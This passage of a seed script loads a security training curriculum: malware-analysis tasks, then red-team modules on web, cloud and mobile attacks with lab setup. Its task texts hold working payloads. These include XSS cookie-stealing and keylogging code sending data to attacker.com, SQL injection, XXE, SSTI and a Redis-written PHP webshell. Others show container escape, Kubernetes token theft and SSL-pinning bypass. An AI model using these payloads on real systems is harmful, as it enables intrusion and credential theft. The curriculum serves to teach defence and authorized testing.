4. Repeat for subsequent stages
\`\`\`

## Documentation Template
\`\`\`markdown
## Stage 1: Dropper
- Hash: sha256:...
- Encryption: XOR with key 0x5A
- Drops: Stage 2 shellcode

## Stage 2: Shellcode
- Size: 4096 bytes
- Function: Downloads Stage 3 from C2
- C2: http://evil.com/payload.bin

## Stage 3: Final Payload
- Type: RAT (remote access trojan)
- Capabilities: keylogger, screenshot, shell
\`\`\`

## Completion Criteria
- [ ] Identified unpacking routine
- [ ] Extracted all stages
- [ ] Analyzed each stage
- [ ] Documented full chain`],

	['Reverse engineer a RAT/backdoor', 'Analyze command-and-control malware. Identify C2 protocol, commands supported, and persistence mechanism.',
`## RAT Analysis Goals
1. **C2 Communication**: How does it talk to attacker?
2. **Commands**: What can the attacker do?
3. **Persistence**: How does it survive reboot?
4. **IOCs**: What can we detect?

## C2 Protocol Analysis
\`\`\`
1. Set breakpoint on network functions:
   - InternetOpen, HttpOpenRequest, send, recv
2. Capture traffic with Wireshark
3. Identify protocol:
   - HTTP/HTTPS (common)
   - Raw TCP
   - DNS tunneling
   - Custom protocol
\`\`\`

## Command Identification
\`\`\`c
// Look for switch statement or command table
switch(command) {
    case 0x01: execute_shell(); break;
    case 0x02: upload_file(); break;
    case 0x03: download_file(); break;
    case 0x04: screenshot(); break;
    case 0x05: keylogger(); break;
}
\`\`\`

## Common RAT Commands
| Command | Function |
|---------|----------|
| shell | Execute command |
| upload | Send file to C2 |
| download | Get file from C2 |
| screenshot | Capture screen |
| keylog | Record keystrokes |
| persist | Install persistence |
| die | Uninstall |

## Persistence Mechanisms
\`\`\`
Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Scheduled Task: schtasks /create
Service: sc create
Startup Folder: shell:startup
\`\`\`

## Completion Criteria
- [ ] Identified C2 protocol and server
- [ ] Documented all commands
- [ ] Found persistence mechanism
- [ ] Extracted network IOCs`],

	['Write a malware analysis report', 'Document a complete analysis: summary, static findings, dynamic behavior, network indicators, MITRE mappings, and detection recommendations.',
`## Report Template

### 1. Executive Summary
\`\`\`
Sample: Emotet loader variant
Type: Banking trojan / botnet
Severity: High
First Seen: 2024-01-15
Capabilities: Credential theft, spam, payload delivery
\`\`\`

### 2. Sample Information
\`\`\`
Filename: invoice.doc
MD5: abc123...
SHA256: def456...
File Type: MS Word Document with VBA macro
File Size: 156 KB
\`\`\`

### 3. Static Analysis
\`\`\`
- Packed: Yes (UPX)
- Imports: VirtualAlloc, CreateRemoteThread
- Strings: Base64 encoded PowerShell
- Resources: Embedded DLL
\`\`\`

### 4. Dynamic Analysis
\`\`\`
Execution Flow:
1. Macro executes PowerShell
2. Downloads stage2.dll
3. Injects into explorer.exe
4. Connects to C2

Persistence:
- Registry: HKCU\\...\\Run\\WindowsUpdate
\`\`\`

### 5. Network Indicators
\`\`\`
C2 Servers:
- 192.168.1.100:443
- evil-domain.com

User-Agent: Mozilla/5.0 (compatible)
Protocol: HTTPS POST
\`\`\`

### 6. MITRE ATT&CK Mapping
| Technique | ID | Description |
|-----------|-----|-------------|
| Phishing | T1566.001 | Macro document |
| PowerShell | T1059.001 | Encoded commands |
| Process Injection | T1055 | Into explorer.exe |
| Registry Run Keys | T1547.001 | Persistence |

### 7. Detection Recommendations
\`\`\`
YARA: [attach rule]
Sigma: [attach rule]
Network: Block IOCs at firewall
Endpoint: Monitor for macro → PowerShell
\`\`\`

## Completion Criteria
- [ ] All sections completed
- [ ] IOCs in machine-readable format
- [ ] MITRE mappings accurate
- [ ] Detection rules provided`],
];
blueM4Tasks.forEach((t, i) => insertTask.run(blueM4.lastInsertRowid, t[0], t[1], t[2], i, now));

// ============================================================================
// RED TEAM EXTENDED - WEB, CLOUD, MOBILE
// ============================================================================
const redExtPath = insertPath.run(
	'Red Team Extended: Web, Cloud & Mobile',
	'Expand offensive skills beyond Windows/AD. Master web application attacks, cloud security (AWS/Azure), mobile app testing, and social engineering.',
	'red',
	now
);

// Module 1: Web Application Attacks
const redM1 = insertModule.run(redExtPath.lastInsertRowid, 'Web Application Attacks', 'Master OWASP Top 10 and advanced web exploitation', 0, now);
const redM1Tasks: [string, string, string][] = [
	['Set up a web hacking lab', 'Deploy DVWA, WebGoat, and Juice Shop locally with Docker. These provide safe, legal targets for practicing web attacks.',
`## Docker Setup
\`\`\`bash
# DVWA - Classic vulnerable app
docker run -d -p 8080:80 vulnerables/web-dvwa

# OWASP Juice Shop - Modern vulnerable app
docker run -d -p 3000:3000 bkimminich/juice-shop

# WebGoat - Learning platform
docker run -d -p 8081:8080 webgoat/webgoat
\`\`\`

## Burp Suite Configuration
1. Set browser proxy: 127.0.0.1:8080
2. Add targets to scope
3. Enable interception for testing

## Lab Network
\`\`\`
┌─────────────┐     ┌─────────────┐
│   Browser   │────▶│ Burp Suite  │
└─────────────┘     └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              ▼            ▼            ▼
         ┌────────┐  ┌──────────┐  ┌─────────┐
         │  DVWA  │  │JuiceShop │  │ WebGoat │
         │ :8080  │  │  :3000   │  │  :8081  │
         └────────┘  └──────────┘  └─────────┘
\`\`\`

## Practice Order
1. **DVWA**: Start here, difficulty levels
2. **Juice Shop**: Modern app, scoreboard
3. **WebGoat**: Guided lessons

## Completion Criteria
- [ ] All three apps running
- [ ] Burp Suite configured
- [ ] Completed DVWA low-security exercises
- [ ] Found first Juice Shop flag`],

	['Master SQL injection techniques', 'Practice union-based, blind boolean, and time-based SQLi. Use sqlmap for automation but understand manual techniques.',
`## SQL Injection Types

### Union-Based
\`\`\`sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
\`\`\`

### Boolean-Based Blind
\`\`\`sql
' AND 1=1--  (true - normal response)
' AND 1=2--  (false - different response)
' AND SUBSTRING(username,1,1)='a'--
\`\`\`

### Time-Based Blind
\`\`\`sql
' AND SLEEP(5)--
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
\`\`\`

## Manual Testing Steps
\`\`\`
1. Find injection point: ' " ; --
2. Determine column count: ORDER BY 1,2,3...
3. Find displayed columns: UNION SELECT 1,2,3
4. Extract database info:
   - @@version (MySQL)
   - database(), user()
5. Extract tables: information_schema.tables
6. Extract data: SELECT * FROM users
\`\`\`

## sqlmap Usage
\`\`\`bash
# Basic scan
sqlmap -u "http://target/page?id=1" --dbs

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc"

# Extract data
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# OS shell (if possible)
sqlmap -u "http://target/page?id=1" --os-shell
\`\`\`

## Completion Criteria
- [ ] Exploited UNION-based SQLi manually
- [ ] Exploited blind SQLi
- [ ] Used sqlmap to extract database
- [ ] Understand how to get OS access via SQLi`],

	['Exploit XSS vulnerabilities', 'Find and exploit reflected, stored, and DOM-based XSS. Progress from alert boxes to session hijacking.',
`## XSS Types

### Reflected XSS
\`\`\`
http://target/search?q=<script>alert(1)</script>
\`\`\`

### Stored XSS
\`\`\`html
<!-- In comment field -->
<script>alert(document.cookie)</script>
\`\`\`

### DOM-based XSS
\`\`\`javascript
// Vulnerable code
document.write(location.hash)
// Exploit
http://target/#<img src=x onerror=alert(1)>
\`\`\`

## Payload Progression
\`\`\`javascript
// 1. Proof of concept
<script>alert(1)</script>

// 2. Cookie stealing
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>

// 3. Keylogger
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key)
}
</script>

// 4. Phishing overlay
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white">
  <h1>Session expired. Please login:</h1>
  <form action="http://attacker.com/phish">...</form>
</div>
\`\`\`

## WAF Bypass Techniques
\`\`\`html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Without parentheses -->
<script>alert\`1\`</script>
\`\`\`

## Completion Criteria
- [ ] Found all three XSS types in lab
- [ ] Stole session cookie
- [ ] Bypassed a WAF filter
- [ ] Created realistic attack payload`],

	['Attack authentication mechanisms', 'Test for: weak passwords, credential stuffing, session fixation, JWT attacks, OAuth misconfigurations, and 2FA bypasses.',
`## Authentication Attack Checklist

### Password Attacks
\`\`\`bash
# Brute force with Hydra
hydra -l admin -P wordlist.txt http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# Credential stuffing (leaked creds)
# Use breach databases, test on target
\`\`\`

### Session Attacks
\`\`\`
Session Fixation:
1. Attacker gets session ID
2. Sends link with session to victim
3. Victim logs in, same session
4. Attacker uses session

Test: Does session ID change after login?
\`\`\`

### JWT Attacks
\`\`\`python
# None algorithm attack
import jwt
token = jwt.encode({"user": "admin"}, key="", algorithm="none")

# Weak secret brute force
hashcat -m 16500 jwt.txt wordlist.txt

# Key confusion (RS256 → HS256)
# Sign with public key as HMAC secret
\`\`\`

### OAuth Misconfiguration
\`\`\`
1. Open redirect in redirect_uri
   ?redirect_uri=https://attacker.com

2. Token leakage via referrer
   Steal token from URL fragment

3. CSRF in OAuth flow
   Missing state parameter
\`\`\`

### 2FA Bypass
\`\`\`
- Brute force code (if no rate limit)
- Response manipulation (change false→true)
- Backup codes (easier to guess)
- Skip 2FA step directly
\`\`\`

## Completion Criteria
- [ ] Tested password brute force
- [ ] Exploited JWT vulnerability
- [ ] Found OAuth misconfiguration
- [ ] Attempted 2FA bypass`],

	['Exploit server-side vulnerabilities', 'Practice SSRF, XXE, SSTI, and insecure deserialization.',
`## SSRF (Server-Side Request Forgery)

### Basic SSRF
\`\`\`
# Access internal services
?url=http://127.0.0.1:8080/admin
?url=http://169.254.169.254/  # AWS metadata

# Protocol smuggling
?url=file:///etc/passwd
?url=gopher://127.0.0.1:6379/_SET%20key%20value
\`\`\`

## XXE (XML External Entity)

### Basic XXE
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
\`\`\`

### Blind XXE (OOB)
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
\`\`\`

## SSTI (Server-Side Template Injection)

### Detection
\`\`\`
{{7*7}}     → 49 (Jinja2, Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
\`\`\`

### Exploitation (Jinja2)
\`\`\`python
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Find subprocess.Popen, execute commands
\`\`\`

## Insecure Deserialization

### Java
\`\`\`bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
\`\`\`

### PHP
\`\`\`php
O:8:"Malicious":1:{s:4:"cmd";s:6:"whoami";}
\`\`\`

## Completion Criteria
- [ ] Exploited SSRF to access internal service
- [ ] Read file via XXE
- [ ] Achieved RCE via SSTI
- [ ] Understand deserialization attacks`],

	['Chain vulnerabilities for maximum impact', 'Combine multiple lower-severity bugs into critical chains.',
`## Vulnerability Chaining

### Example Chain 1: IDOR → Account Takeover
\`\`\`
1. IDOR: Change user_id in API request
   GET /api/user/123/email → victim@email.com

2. Password reset sends to displayed email
   POST /reset → Uses the IDOR-returned email

3. Change victim's email to attacker's
   PUT /api/user/123/email → attacker@email.com

4. Reset victim's password → sent to attacker
\`\`\`

### Example Chain 2: Open Redirect → Token Theft
\`\`\`
1. Find open redirect
   /redirect?url=https://evil.com

2. Use in OAuth flow
   /oauth/authorize?redirect_uri=/redirect?url=https://evil.com

3. Token sent to attacker's server
   https://evil.com#access_token=xyz
\`\`\`

### Example Chain 3: XSS → Admin Compromise
\`\`\`
1. Stored XSS in support ticket

2. Admin views ticket, XSS executes

3. XSS payload:
   - Steals admin session
   - Or: creates new admin account
   - Or: changes admin password
\`\`\`

### Example Chain 4: SSRF → RCE
\`\`\`
1. SSRF allows internal requests

2. Internal Redis accessible
   ?url=gopher://127.0.0.1:6379/_SET%20foo%20bar

3. Write webshell via Redis
   CONFIG SET dir /var/www/html
   CONFIG SET dbfilename shell.php
   SET payload "<?php system($_GET['c']); ?>"
   SAVE
\`\`\`

## Chaining Methodology
\`\`\`
1. Find all vulnerabilities, even low-severity
2. Map data flow and trust boundaries
3. Look for connections between bugs
4. Consider: What if I chain A with B?
5. Document the full chain with steps
\`\`\`

## Completion Criteria
- [ ] Identified multiple low-severity bugs
- [ ] Successfully chained 2+ vulns
- [ ] Achieved higher impact than individual bugs
- [ ] Documented chain clearly`],

	['Perform a full web app assessment', 'Conduct end-to-end pentest of a target app. Document methodology, findings, and provide actionable remediation.',
`## Assessment Methodology

### Phase 1: Reconnaissance
\`\`\`
- Map application structure (Burp Spider)
- Identify technologies (Wappalyzer)
- Find hidden endpoints (gobuster, ffuf)
- Review JavaScript for API endpoints
\`\`\`

### Phase 2: Authentication Testing
\`\`\`
- Password policy strength
- Brute force protection
- Session management
- Password reset flow
- Remember me functionality
\`\`\`

### Phase 3: Authorization Testing
\`\`\`
- Horizontal privilege escalation (IDOR)
- Vertical privilege escalation
- Missing function-level access control
- Insecure direct object references
\`\`\`

### Phase 4: Input Validation
\`\`\`
- SQL injection
- XSS (reflected, stored, DOM)
- Command injection
- Path traversal
- File upload vulnerabilities
\`\`\`

### Phase 5: Business Logic
\`\`\`
- Price manipulation
- Workflow bypass
- Rate limiting
- Race conditions
\`\`\`

## Report Template
\`\`\`markdown
## Executive Summary
Brief overview for management

## Findings
### Critical
[Vuln 1] - SQL Injection in login
- Description
- Steps to reproduce
- Impact
- Remediation

### High
[Vuln 2] - Stored XSS in profile
...

## Methodology
Tools and techniques used

## Recommendations
Prioritized remediation plan
\`\`\`

## Completion Criteria
- [ ] Completed all testing phases
- [ ] Documented all findings
- [ ] Provided clear reproduction steps
- [ ] Included remediation guidance`],
];
redM1Tasks.forEach((t, i) => insertTask.run(redM1.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 2: Cloud Security (AWS/Azure)
const redM2 = insertModule.run(redExtPath.lastInsertRowid, 'Cloud Security & Attacks', 'Attack and defend cloud infrastructure', 1, now);
const redM2Tasks: [string, string, string][] = [
	['Set up cloud pentesting lab', 'Create AWS free tier and Azure trial accounts. Deploy intentionally vulnerable environments: CloudGoat, flAWS, AzureGoat.',
`## Lab Environments

### CloudGoat (AWS)
\`\`\`bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat
cd cloudgoat
pip install -r requirements.txt
./cloudgoat.py config profile
./cloudgoat.py create iam_privesc_by_rollback
\`\`\`

### flAWS Challenge
- http://flaws.cloud - AWS misconfigurations
- http://flaws2.cloud - More advanced

### AzureGoat
\`\`\`bash
git clone https://github.com/ine-labs/AzureGoat
cd AzureGoat
terraform init
terraform apply
\`\`\`

## AWS CLI Setup
\`\`\`bash
aws configure
# Enter access key, secret key, region

# Test access
aws sts get-caller-identity
\`\`\`

## Azure CLI Setup
\`\`\`bash
az login
az account list
az account set --subscription "Sub Name"
\`\`\`

## Safety Rules
- Use dedicated accounts, not production
- Set billing alerts
- Destroy resources after practice
- Never test on real targets without authorization

## Completion Criteria
- [ ] AWS free tier account created
- [ ] CloudGoat scenario deployed
- [ ] Completed flaws.cloud level 1
- [ ] Azure trial set up`],

	['Enumerate cloud resources', 'Use tools like ScoutSuite, Prowler, and enumerate_iam. Find exposed S3 buckets, overly permissive IAM policies, and public resources.',
`## AWS Enumeration

### ScoutSuite (Multi-cloud)
\`\`\`bash
pip install scoutsuite
scout aws --profile myprofile
# Open report in browser
\`\`\`

### Prowler (AWS)
\`\`\`bash
pip install prowler
prowler aws
prowler aws -c s3  # S3 checks only
\`\`\`

### Manual Enumeration
\`\`\`bash
# List S3 buckets
aws s3 ls

# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# List IAM users
aws iam list-users

# Get user policies
aws iam list-attached-user-policies --user-name user

# List EC2 instances
aws ec2 describe-instances
\`\`\`

### enumerate-iam
\`\`\`bash
git clone https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key AKIA... --secret-key ...
\`\`\`

## Azure Enumeration
\`\`\`bash
# List resources
az resource list

# List storage accounts
az storage account list

# Check role assignments
az role assignment list
\`\`\`

## Common Findings
- Public S3 buckets with sensitive data
- IAM users with inline policies (hard to audit)
- EC2 instances with public IPs and weak security groups
- Unused access keys
- Missing MFA on privileged accounts

## Completion Criteria
- [ ] Ran ScoutSuite or Prowler
- [ ] Found at least one misconfiguration
- [ ] Enumerated IAM permissions
- [ ] Identified exposed resources`],

	['Exploit IAM misconfigurations', 'Practice privilege escalation via: overly permissive policies, role assumption chains, and instance profile abuse.',
`## IAM Privilege Escalation Techniques

### 1. Policy Version Rollback
\`\`\`bash
# If user can set policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::123:policy/MyPolicy
aws iam set-default-policy-version --policy-arn ... --version-id v1
\`\`\`

### 2. Assume Role Chain
\`\`\`bash
# User can assume RoleA, RoleA can assume RoleB (admin)
aws sts assume-role --role-arn arn:aws:iam::123:role/RoleA
# Use RoleA creds to assume RoleB
aws sts assume-role --role-arn arn:aws:iam::123:role/RoleB
\`\`\`

### 3. Instance Profile Abuse
\`\`\`bash
# From compromised EC2, query metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
# Use retrieved credentials
\`\`\`

### 4. Lambda Function Modification
\`\`\`bash
# If can update Lambda code
aws lambda update-function-code --function-name func \
  --zip-file fileb://malicious.zip
# Lambda runs with its execution role
\`\`\`

### Pacu Framework
\`\`\`bash
pip install pacu
pacu
# Inside pacu:
import_keys --all
run iam__enum_permissions
run iam__privesc_scan
\`\`\`

## Common Dangerous Permissions
- iam:CreateAccessKey (on other users)
- iam:AttachUserPolicy
- sts:AssumeRole (on privileged roles)
- lambda:UpdateFunctionCode
- ec2:RunInstances (with instance profile)

## Completion Criteria
- [ ] Identified privesc path
- [ ] Successfully escalated privileges
- [ ] Used Pacu for automation
- [ ] Documented the attack chain`],

	['Attack serverless functions', 'Exploit Lambda/Azure Functions: injection in event data, environment variable secrets, overprivileged execution roles.',
`## Serverless Attack Surface

### Event Data Injection
\`\`\`python
# Vulnerable Lambda (Python)
def handler(event, context):
    name = event['name']
    os.system(f"echo Hello {name}")  # Command injection!

# Exploit
{"name": "; cat /etc/passwd"}
\`\`\`

### Environment Variable Secrets
\`\`\`bash
# List function configuration
aws lambda get-function-configuration --function-name MyFunc

# Look for secrets in:
# - Environment.Variables
# - Often: DB passwords, API keys
\`\`\`

### Overprivileged Execution Role
\`\`\`bash
# From inside Lambda (if you get code execution)
import boto3
sts = boto3.client('sts')
print(sts.get_caller_identity())

# Check what the role can do
iam = boto3.client('iam')
# List attached policies, enumerate permissions
\`\`\`

### Attack Techniques
\`\`\`
1. Invoke function with malicious input
2. Read environment variables (secrets)
3. Use execution role for lateral movement
4. Access other AWS services
5. Read /tmp for sensitive data from other invocations
\`\`\`

### Azure Functions
\`\`\`bash
# List functions
az functionapp list

# Get function secrets
az functionapp function keys list \
  --name MyFuncApp --function-name MyFunc -g ResourceGroup
\`\`\`

## Completion Criteria
- [ ] Exploited injection in event data
- [ ] Extracted secrets from environment
- [ ] Abused overprivileged execution role
- [ ] Demonstrated lateral movement`],

	['Pivot through cloud networks', 'Exploit VPC peering, transit gateways, and hybrid connections. Move from cloud to on-prem and back.',
`## Cloud Network Pivoting

### VPC Peering Exploitation
\`\`\`
Scenario: Compromised EC2 in VPC-A, VPC-A peers with VPC-B

1. Enumerate peering connections
   aws ec2 describe-vpc-peering-connections

2. Identify routes to peer VPC
   aws ec2 describe-route-tables

3. Scan peer VPC CIDR for targets
   nmap -sP 10.1.0.0/16

4. Attack targets in peer VPC
\`\`\`

### Transit Gateway
\`\`\`
Transit Gateway connects multiple VPCs

1. Enumerate attachments
   aws ec2 describe-transit-gateway-attachments

2. All attached VPCs potentially reachable
3. Central point of network access
\`\`\`

### Hybrid Connections (VPN/Direct Connect)
\`\`\`
AWS → On-Premises pivot

1. Identify VPN connections
   aws ec2 describe-vpn-connections

2. Check routes to on-prem CIDRs
   192.168.0.0/16 → On-prem network

3. From EC2, scan on-prem network
4. Pivot to internal systems
\`\`\`

### SSM Session Manager Pivot
\`\`\`bash
# If you have SSM access to EC2
aws ssm start-session --target i-1234567890

# Use EC2 as pivot point
# Set up port forwarding
aws ssm start-session --target i-1234567890 \
  --document-name AWS-StartPortForwardingSession \
  --parameters "localPortNumber=8080,portNumber=80"
\`\`\`

## Network Diagram Example
\`\`\`
[Internet]
    |
[VPC-A: DMZ] ←── Compromised here
    |
[VPC Peering]
    |
[VPC-B: Internal]
    |
[VPN/Direct Connect]
    |
[On-Premises DC]
\`\`\`

## Completion Criteria
- [ ] Enumerated network topology
- [ ] Identified peering/transit connections
- [ ] Pivoted to connected network
- [ ] Documented attack path`],

	['Attack container orchestration', 'Exploit Kubernetes misconfigurations: exposed dashboards, privileged containers, mounted service accounts.',
`## Kubernetes Attack Surface

### Exposed Dashboard
\`\`\`bash
# Unauthenticated dashboard (bad!)
kubectl proxy &
curl http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Or externally exposed
https://target:30000/dashboard
\`\`\`

### Privileged Container Escape
\`\`\`yaml
# Dangerous pod spec
spec:
  containers:
  - name: pwned
    securityContext:
      privileged: true  # Full host access!
\`\`\`
\`\`\`bash
# From inside privileged container
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
# Now you're on the host!
\`\`\`

### Service Account Token Abuse
\`\`\`bash
# Every pod has SA token mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to access API
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/...)" \
  https://kubernetes.default.svc/api/v1/namespaces

# If SA has cluster-admin...game over
\`\`\`

### RBAC Misconfigurations
\`\`\`bash
# Check what you can do
kubectl auth can-i --list

# Dangerous permissions
- create pods (run arbitrary containers)
- get secrets (steal credentials)
- exec into pods (compromise workloads)
\`\`\`

### etcd Access
\`\`\`bash
# If etcd is exposed
ETCDCTL_API=3 etcdctl get / --prefix --keys-only
# Contains all cluster secrets!
\`\`\`

## Completion Criteria
- [ ] Enumerated K8s resources
- [ ] Escaped from privileged container
- [ ] Abused service account token
- [ ] Accessed secrets`],

	['Perform a cloud security assessment', 'Conduct full assessment of a cloud environment. Review IAM, network security, data storage, logging, and provide recommendations.',
`## Assessment Framework

### 1. IAM Review
\`\`\`
□ Users with console access have MFA
□ No root account access keys
□ Least privilege policies
□ No inline policies (use managed)
□ Regular access key rotation
□ No unused credentials
\`\`\`

### 2. Network Security
\`\`\`
□ Security groups follow least privilege
□ No 0.0.0.0/0 on sensitive ports
□ VPC flow logs enabled
□ Network segmentation in place
□ Private subnets for internal resources
□ NAT gateway for outbound-only
\`\`\`

### 3. Data Storage
\`\`\`
□ S3 buckets not public
□ S3 encryption enabled
□ RDS/databases encrypted
□ No secrets in environment variables
□ Secrets Manager/Vault for secrets
□ Backup encryption
\`\`\`

### 4. Logging & Monitoring
\`\`\`
□ CloudTrail enabled (all regions)
□ CloudTrail logs to secure S3
□ CloudWatch alarms for suspicious activity
□ GuardDuty enabled
□ Config rules for compliance
\`\`\`

### 5. Compute Security
\`\`\`
□ AMIs from trusted sources
□ Instance metadata v2 enforced
□ No public IPs on internal instances
□ SSM instead of SSH
□ Container images scanned
\`\`\`

## Report Template
\`\`\`markdown
## Executive Summary
Overall risk: HIGH/MEDIUM/LOW

## Findings by Severity
### Critical
- Public S3 bucket: customer-data-bucket

### High
- Root account has access keys

### Medium
- CloudTrail not enabled in us-west-2

## Recommendations
1. Enable S3 Block Public Access
2. Delete root access keys
3. Enable CloudTrail in all regions
\`\`\`

## Completion Criteria
- [ ] Completed all assessment areas
- [ ] Documented findings with evidence
- [ ] Prioritized by risk
- [ ] Provided remediation guidance`],
];
redM2Tasks.forEach((t, i) => insertTask.run(redM2.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 3: Mobile Application Security
const redM3 = insertModule.run(redExtPath.lastInsertRowid, 'Mobile Application Security', 'Android and iOS application testing', 2, now);
const redM3Tasks: [string, string, string][] = [
	['Set up mobile testing environment', 'Configure Android emulator with Frida and Objection. For iOS, set up a jailbroken device or use Corellium.',
`## Android Setup

### Android Emulator
\`\`\`bash
# Install Android Studio for emulator
# Create emulator without Google Play (for root)

# Or use Genymotion (easier root)
\`\`\`

### Frida Installation
\`\`\`bash
# On host
pip install frida-tools

# Push frida-server to device
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell "/data/local/tmp/frida-server &"

# Test
frida-ps -U
\`\`\`

### Objection
\`\`\`bash
pip install objection

# Connect to running app
objection -g com.target.app explore
\`\`\`

## iOS Setup

### Jailbroken Device
- Use checkra1n or unc0ver
- Install Cydia, then Frida

### Corellium (Virtual)
- Cloud iOS devices with jailbreak
- Enterprise pricing but powerful

## Burp Suite Configuration
\`\`\`
1. Proxy → Options → Add listener on all interfaces
2. Export CA certificate
3. Install cert on device (Settings → Security)
4. Set device proxy to Burp IP:8080
\`\`\`

## Completion Criteria
- [ ] Android emulator with root
- [ ] Frida server running
- [ ] Objection working
- [ ] Burp intercepting traffic`],

	['Bypass SSL pinning', 'Use Frida scripts to bypass certificate pinning in Android and iOS apps. Intercept and modify HTTPS traffic.',
`## SSL Pinning Overview
Apps verify server certificate matches expected value, blocking MITM.

## Android Bypass Methods

### Frida Script
\`\`\`javascript
// Universal SSL pinning bypass
Java.perform(function() {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManagerImpl = Java.registerClass({
        name: 'TrustManagerImpl',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    // ... hook SSLContext.init()
});
\`\`\`

### Objection (Easier)
\`\`\`bash
objection -g com.target.app explore
# Inside objection:
android sslpinning disable
\`\`\`

### Using Frida Codeshare
\`\`\`bash
frida -U -l https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/
\`\`\`

## iOS Bypass

### Objection
\`\`\`bash
objection -g com.target.app explore
ios sslpinning disable
\`\`\`

### SSL Kill Switch
- Install via Cydia
- System-wide pinning bypass

## Verifying Bypass
\`\`\`
1. Start app with pinning bypass
2. Browse app functionality
3. Check Burp for HTTPS traffic
4. If traffic appears, bypass worked
\`\`\`

## Completion Criteria
- [ ] Bypassed pinning on Android app
- [ ] Bypassed pinning on iOS app
- [ ] Intercepted HTTPS traffic
- [ ] Modified requests/responses`],

	['Analyze Android APKs', 'Decompile APKs with jadx, analyze Smali with apktool. Find hardcoded secrets, API keys, and insecure storage.',
`## APK Analysis Workflow

### 1. Get APK
\`\`\`bash
# From device
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk

# From APK Mirror or similar
\`\`\`

### 2. Decompile with jadx
\`\`\`bash
jadx-gui app.apk
# Browse decompiled Java code
# Search for strings, API calls
\`\`\`

### 3. Analyze with apktool
\`\`\`bash
apktool d app.apk
# Produces: smali/, res/, AndroidManifest.xml
\`\`\`

## What to Look For

### Hardcoded Secrets
\`\`\`bash
# Search for common patterns
grep -r "api_key" .
grep -r "secret" .
grep -r "password" .
grep -rE "AIza[0-9A-Za-z-_]{35}" .  # Google API key
grep -rE "AKIA[0-9A-Z]{16}" .       # AWS access key
\`\`\`

### AndroidManifest.xml
\`\`\`xml
<!-- Check for: -->
- android:debuggable="true"
- android:allowBackup="true"
- Exported components (activities, services)
- Permissions requested
\`\`\`

### Insecure Storage
\`\`\`java
// SharedPreferences (plaintext)
SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
prefs.getString("password", "");

// SQLite databases
// External storage
\`\`\`

## Tools Summary
| Tool | Purpose |
|------|---------|
| jadx | Java decompilation |
| apktool | Smali, resources |
| MobSF | Automated analysis |
| dex2jar | Convert to JAR |

## Completion Criteria
- [ ] Decompiled APK successfully
- [ ] Found hardcoded secrets
- [ ] Reviewed AndroidManifest
- [ ] Identified insecure storage`],

	['Exploit insecure data storage', 'Find sensitive data in: SharedPreferences, SQLite databases, external storage, and backup files.',
`## Data Storage Locations

### SharedPreferences
\`\`\`bash
# Location
/data/data/com.target.app/shared_prefs/

# Pull from rooted device
adb shell cat /data/data/com.target.app/shared_prefs/config.xml
\`\`\`
\`\`\`xml
<!-- Often contains -->
<string name="auth_token">eyJ...</string>
<string name="password">plaintext!</string>
\`\`\`

### SQLite Databases
\`\`\`bash
# Location
/data/data/com.target.app/databases/

# Pull and analyze
adb pull /data/data/com.target.app/databases/app.db
sqlite3 app.db
.tables
SELECT * FROM users;
\`\`\`

### External Storage
\`\`\`bash
# World-readable!
/sdcard/Android/data/com.target.app/
/sdcard/Download/

# Any app can read these
\`\`\`

### Backup Exploitation
\`\`\`bash
# If android:allowBackup="true"
adb backup -apk com.target.app -f backup.ab

# Extract backup
java -jar abe.jar unpack backup.ab backup.tar
tar -xf backup.tar
# Contains SharedPrefs, databases, files
\`\`\`

## Objection Commands
\`\`\`bash
objection -g com.target.app explore

# List files
ls /data/data/com.target.app/

# Download files
file download /data/data/com.target.app/shared_prefs/config.xml

# SQLite
sqlite connect /data/data/com.target.app/databases/app.db
\`\`\`

## iOS Locations
\`\`\`
Documents/
Library/Preferences/*.plist
Library/Caches/
Keychain (objection: ios keychain dump)
\`\`\`

## Completion Criteria
- [ ] Extracted SharedPreferences
